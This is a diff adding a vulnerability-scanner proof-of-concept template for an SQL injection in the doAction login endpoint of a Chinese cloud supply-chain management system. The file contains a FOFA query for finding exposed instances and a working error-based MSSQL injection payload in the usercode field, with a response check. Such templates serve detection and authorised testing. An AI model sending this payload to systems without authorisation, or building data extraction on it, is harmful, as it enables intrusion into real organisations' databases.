@@ -1,0 +1,20 @@
+id: poc-yaml-cloud-scms-doaction-sqli
+info:
+  name: 云供应链管理系统 doAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 云供应链管理系统
+  fofa: app="秒优科技-供应链管理系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /zh/login/doAction
+  headers:
+    Content-Type: application/json
+  data: '{"usercode":"1''+(SELECT CHAR(83) WHERE 6635=6635 AND 2366 IN (SELECT (sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}'')))))+''","password":"1","remember":false,"ip":null,"city":null,"ISERP":"ISERP"}'
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"SqlException") && contains(body,"0x" + t2)
+transport: http
